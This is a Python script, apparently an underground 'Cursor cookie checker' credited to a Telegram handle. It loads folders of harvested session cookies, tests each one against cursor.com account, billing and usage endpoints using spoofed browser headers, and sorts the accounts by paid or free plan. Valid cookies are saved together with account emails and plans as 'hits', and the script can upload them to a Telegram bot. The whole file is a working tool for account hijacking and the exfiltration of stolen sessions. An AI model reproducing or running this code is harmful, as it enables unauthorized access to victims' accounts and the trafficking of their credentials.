import requests
import os
import colorama
import json
import threading
import time
import webbrowser
from datetime import datetime, timezone
from queue import Queue, Empty
from requests.cookies import RequestsCookieJar
from cfonts import render
import urllib3
urllib3.disable_warnings()

colorama.init(autoreset=True)
G = colorama.Fore.GREEN
Y = colorama.Fore.YELLOW
C = colorama.Fore.CYAN
R = colorama.Fore.RED
B = colorama.Fore.BLUE
W = colorama.Fore.WHITE
X = colorama.Fore.RESET
BT = colorama.Style.BRIGHT
S = colorama.Style.RESET_ALL

TG_TOKEN = ""
TG_CHAT_ID = ""
PRINT_LOCK = threading.Lock()
ST = {'total': 0, 'done': 0, 'paid': 0, 'free': 0, 'bad': 0, 'start': 0.0}
ST_LOCK = threading.Lock()
DASH_EVERY = 50

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "host": "cursor.com",
    "accept-language": "en-GB,en;q=0.9",
    "priority": "u=1, i",
    "referer": "https://cursor.com/dashboard",
    "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "content-type": "application/json",
    "accept-encoding": "gzip, deflate, br, zstd",
}


def pr(line=''):
    with PRINT_LOCK:
        print(line, flush=True)


def print_dash():
    with ST_LOCK:
        total = ST['total']
        done = ST['done']
        paid = ST['paid']
        free = ST['free']
        bad = ST['bad']
        elapsed = time.time() - ST['start'] if ST['start'] else 0
    spd = done / elapsed if elapsed > 0 else 0
    eta = int((total - done) / spd) if spd > 0 else 0
    eta_s = f"{eta // 60}m {eta % 60}s" if eta else '--'
    pct = int(done / total * 100) if total else 0
    with PRINT_LOCK:
        print(
            f"\n{BT}{C}[STATS]{X}{S} "
            f"{B}PAID:{paid}{X} | {Y}FREE:{free}{X} | {R}BAD:{bad}{X} | "
            f"TOTAL:{done}/{total} ({pct}%) | SPEED:{spd:.1f}/s | ETA:{eta_s}\n",
            flush=True
        )


def send_telegram(text, file_path=None):
    if not TG_TOKEN or not TG_CHAT_ID:
        return False
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                r = requests.post(
                    f'https://api.telegram.org/bot{TG_TOKEN}/sendDocument',
                    data={'chat_id': TG_CHAT_ID, 'caption': text[:1024], 'parse_mode': 'HTML'},
                    files={'document': f}, timeout=20
                )
            if r.json().get('ok'):
                return True
        r = requests.post(
            f'https://api.telegram.org/bot{TG_TOKEN}/sendMessage',
            json={'chat_id': TG_CHAT_ID, 'text': text[:4096], 'parse_mode': 'HTML'},
            timeout=20
        )
        return r.json().get('ok', False)
    except:
        return False


def parse_cookies(content):
    content = content.strip()
    if content.startswith('['):
        try:
            arr = json.loads(content)
            if isinstance(arr, list):
                ck = {}
                for c in arr:
                    if not isinstance(c, dict):
                        continue
                    name = c.get('name', '')
                    value = c.get('value', '')
                    if name and value is not None:
                        ck[name] = str(value)
                return ck
        except:
            pass
    ck = {}
    is_ns = False
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith('#HttpOnly_') or line.startswith('#HttpOnly '):
            line = line[1:]
        elif line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            is_ns = True
            name = parts[5]
            value = parts[6]
            if name:
                ck[name] = value
    if is_ns:
        return ck
    if '=' in content:
        hck = {}
        for part in content.replace('\n', ';').split(';'):
            if '=' in part:
                k, _, vv = part.strip().partition('=')
                k = k.strip()
                if k:
                    hck[k] = vv.strip()
        return hck
    return {}


def make_session(cookies_dict):
    session = requests.Session()
    jar = RequestsCookieJar()
    for k, val in cookies_dict.items():
        jar.set(k, val, domain='.cursor.com', path='/')
        jar.set(k, val, domain='cursor.com', path='/')
    session.cookies = jar
    session.verify = True
    return session


def fetch_account(session):
    info = {
        'logged_in': False,
        'name': None,
        'email': None,
        'status': None,
        'plan': None,
        'is_paid': False,
        'credit': None,
        'next_renew': None,
    }
    try:
        r1 = session.get(
            'https://cursor.com/api/auth/me',
            headers=HEADERS, timeout=20, allow_redirects=False
        )
        if r1.status_code in (401, 403, 301, 302, 307, 308):
            return info
        if r1.status_code == 200:
            d1 = r1.json()
            info['name'] = d1.get('name')
            info['email'] = d1.get('email')
            info['logged_in'] = bool(info['email'])
    except:
        return info
    if not info['logged_in']:
        return info
    try:
        r2 = session.get(
            'https://cursor.com/api/auth/stripe',
            headers=HEADERS, timeout=15, allow_redirects=False
        )
        if r2.status_code == 200:
            d2 = r2.json()
            info['status'] = d2.get('subscriptionStatus')
            info['plan'] = d2.get('membershipType')
            plan_raw = (info['plan'] or '').lower()
            status_raw = (info['status'] or '').lower()
            if plan_raw != 'free' and status_raw != 'unpaid':
                info['is_paid'] = True
    except:
        pass
    try:
        r3 = session.get(
            'https://cursor.com/api/dashboard/get-current-period-usage',
            headers=HEADERS, timeout=15, allow_redirects=False
        )
        if r3.status_code == 200:
            d3 = r3.json()
            remaining = d3.get('remaining')
            limit = d3.get('limit')
            if remaining is not None and limit is not None:
                info['credit'] = f"{remaining}/{limit}"
            bce = d3.get('billingCycleEnd')
            if bce:
                try:
                    ts_str = str(bce)
                    if len(ts_str) > 10:
                        ts_str = ts_str[:10]
                    info['next_renew'] = datetime.fromtimestamp(
                        int(ts_str), tz=timezone.utc
                    ).strftime('%Y-%m-%d')
                except:
                    pass
    except:
        pass
    return info


def v(val, fb='N/A'):
    return str(val) if val not in (None, '') else fb


def build_capture(info, raw_cookie):
    return (
        f"Email: {v(info.get('email'))}\n"
        f"Plan: {v(info.get('plan'))}\n"
        f"Expires: {v(info.get('next_renew'))}\n"
        f"Cookies: @baron_saplar\n\n"
        f"{raw_cookie}\n"
    )


def save_hit(info, raw_cookie, folder, fname):
    os.makedirs(f'hits/{folder}', exist_ok=True)
    path = f'hits/{folder}/{fname}'
    with open(path, 'w', encoding='utf-8') as f:
        f.write(build_capture(info, raw_cookie))
    return path


def build_tg(info):
    label = f"CURSOR {'PAID' if info.get('is_paid') else 'FREE'} ACCOUNT"
    return (
        f"<b>{label}</b>\n\n"
        f"Username: {v(info.get('name'))}\n"
        f"Email: {v(info.get('email'))}\n"
        f"Plan: {v(info.get('plan'))}\n"
        f"Status: {v(info.get('status'))}\n"
        f"Credit: {v(info.get('credit'))}\n"
        f"Expires: {v(info.get('next_renew'))}\n\n"
        f"<i>@baron_saplar</i>"
    )


def _check_dash_maybe():
    if ST['done'] % DASH_EVERY == 0:
        threading.Thread(target=print_dash, daemon=True).start()


def _worker(q):
    while True:
        try:
            item = q.get(timeout=3)
        except Empty:
            break
        try:
            _process(item)
        except Exception as e:
            cookie_dir, fname = item
            with ST_LOCK:
                ST['bad'] += 1
                ST['done'] += 1
            pr(f'{R}BAD: {fname}{X}')
        finally:
            q.task_done()


def _process(item):
    cookie_dir, fname = item
    path = os.path.join(cookie_dir, fname)
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except:
        with ST_LOCK:
            ST['bad'] += 1
            ST['done'] += 1
        pr(f'{R}BAD: {fname}{X}')
        return
    cookies = parse_cookies(content)
    if not cookies:
        with ST_LOCK:
            ST['bad'] += 1
            ST['done'] += 1
        pr(f'{R}BAD: {fname}{X}')
        return
    if 'WorkosCursorSessionToken' not in cookies:
        with ST_LOCK:
            ST['bad'] += 1
            ST['done'] += 1
        pr(f'{R}BAD: {fname}{X}')
        return
    session = make_session(cookies)
    info = fetch_account(session)
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    ep = (info.get('email') or 'unknown').split('@')[0]
    ofname = f"{ts}_{ep}.txt"
    email = v(info.get('email'))
    plan = v(info.get('plan'))
    if not info.get('logged_in'):
        with ST_LOCK:
            ST['bad'] += 1
            ST['done'] += 1
            _check_dash_maybe()
        pr(f'{R}BAD: {fname}{X}')
        return
    if info.get('is_paid'):
        with ST_LOCK:
            ST['paid'] += 1
            ST['done'] += 1
        pr(f'{B}{BT}{plan:<12} | {email:<30} | {v(info.get("credit")):<10}{X}{S}')
        folder = plan.lower().replace(' ', '_')
        hit_path = save_hit(info, content, folder, ofname)
        if TG_TOKEN:
            send_telegram(build_tg(info), hit_path)
        print_dash()
    else:
        with ST_LOCK:
            ST['free'] += 1
            ST['done'] += 1
            _check_dash_maybe()
        pr(f'{Y}FREE         | {email:<30} | {v(info.get("credit")):<10}{X}')
        hit_path = save_hit(info, content, 'free', ofname)
        if TG_TOKEN:
            send_telegram(build_tg(info), hit_path)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def batch_check(cookie_dir):
    global ST
    if not os.path.isdir(cookie_dir):
        pr(f"{R}Folder not found: {cookie_dir}{X}")
        input('\nPress Enter...')
        return
    files = [f for f in os.listdir(cookie_dir) if os.path.isfile(os.path.join(cookie_dir, f))]
    if not files:
        pr(f"{R}No files in folder: {cookie_dir}{X}")
        input('\nPress Enter...')
        return
    try:
        n = int(input(f'\n{len(files)} files found\nThread count (1-30): ').strip())
        if not 1 <= n <= 30:
            n = 5
    except:
        n = 5
    with ST_LOCK:
        ST.update({'total': len(files), 'done': 0,
                   'paid': 0, 'free': 0, 'bad': 0, 'start': time.time()})
    clear_screen()
    pr(render('CURSOR', colors=['cyan', 'blue'], align='center'))
    pr(f"\n{BT}{C}CURSOR COOKIE CHECKER - @baron_saplar{X}{S}")
    pr(f"{cookie_dir} | {len(files)} files | {n} threads | TG: {'ON' if TG_TOKEN else 'OFF'}\n")
    q = Queue()
    for f in files:
        q.put((cookie_dir, f))
    workers = [threading.Thread(target=_worker, args=(q,), daemon=True) for _ in range(n)]
    for w in workers:
        w.start()
    q.join()
    for w in workers:
        w.join(timeout=5)
    elapsed = int(time.time() - ST['start'])
    pr(f"\n{G}COMPLETED - {elapsed // 60}m {elapsed % 60}s{X}")
    pr(f"Paid: {ST['paid']} | Free: {ST['free']} | Bad: {ST['bad']}")
    if TG_TOKEN:
        send_telegram(
            f"<b>Scan Completed</b>\n\n"
            f"Paid: {ST['paid']}\n"
            f"Free: {ST['free']}\n"
            f"Bad: {ST['bad']}\n"
            f"Total: {ST['total']}\n"
            f"Time: {elapsed // 60}m {elapsed % 60}s\n\n"
            f"<i>@baron_saplar</i>"
        )
    input('\nPress Enter...')


def main():
    global TG_TOKEN, TG_CHAT_ID
    clear_screen()
    pr(render('CURSOR', colors=['cyan', 'blue'], align='center'))
    pr(f"\n{BT}{C}CURSOR COOKIE CHECKER{X}{S}")
    pr(f"{C}by @baron_saplar{X}\n")
    webbrowser.open('https://t.me/BaronSec2')
    time.sleep(1)
    TG_TOKEN = input('Bot Token: ').strip()
    TG_CHAT_ID = input('Chat ID: ').strip()
    if TG_TOKEN and TG_CHAT_ID:
        ok = send_telegram('<b>Cursor Checker Connected!</b>\n\n<i>@baron_saplar</i>')
        pr(f'Telegram: {G if ok else R}{"OK" if ok else "FAILED"}{X}\n')
    cookie_dir = input('\nCookie folder path (default = ./cookies): ').strip()
    if not cookie_dir:
        cookie_dir = 'cookies'
    cookie_dir = cookie_dir.rstrip('/\\')
    batch_check(cookie_dir)


if __name__ == '__main__':
    for d in ['cookies', 'hits/pro', 'hits/business', 'hits/team',
              'hits/enterprise', 'hits/free']:
        os.makedirs(d, exist_ok=True)
    main()